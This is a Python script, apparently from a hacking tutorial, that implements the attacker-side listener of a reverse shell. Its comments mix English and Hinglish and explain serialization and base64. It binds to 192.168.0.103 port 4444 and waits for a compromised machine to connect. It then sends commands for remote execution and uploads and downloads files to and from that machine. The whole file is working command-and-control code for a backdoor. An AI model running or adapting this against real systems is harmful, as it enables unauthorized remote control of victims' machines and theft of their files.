#!/usr/bin/env python
import socket
import json
import base64

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0) ##how many incoming connections we're willing to queue before denying any more.
        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept() ## where connection is used to send and receive the data and address contains the ip address of the connector.
        print("[+] Got a connection from"+str(address))


##issues like difficult to identity the end of message and only limited data was able to tranfser. So to aviod this we have use a concept called Serialization. 
##Serialization is the process of converting an object into a stream of bytes to store the object or transmit it to memory, a database, or a file. Its main purpose is to save the state of an object in order to be able to recreate it when needed. 

    def reliable_send(self,data):
        json_data = json.dumps(data) ## converts the data into json object 
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024) ## ek attemp me sab data nhi aata eesliye while True rakha hai
                return json.loads(json_data)
            except ValueError: ## as ek attempt me sab data nhi aaraha hai to vo packet thik se unpack nhi hoga eesliye vo ye error dega so ye except kr rahai hai
                continue

    def execute_remotely(self,command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content): ## Download function ke liye 
        with open(path, "wb") as file:
            file.write(base64.b64decode(content)) ### aagar download vali file img ya video rhega to error marega bcz specail char aata hai uusme so base64 use kiya hai and as eedar write ho raha hai eesliye decode use kiya hai.
            return "[+] Download Successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">>")
            command = command.split(" ")
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content)
            result = self.execute_remotely(command)

            if command[0] == "download":
                result = self.write_file(command[1], result)
            print(result)

my_listener = Listener("192.168.0.103",4444)
my_listener.run()
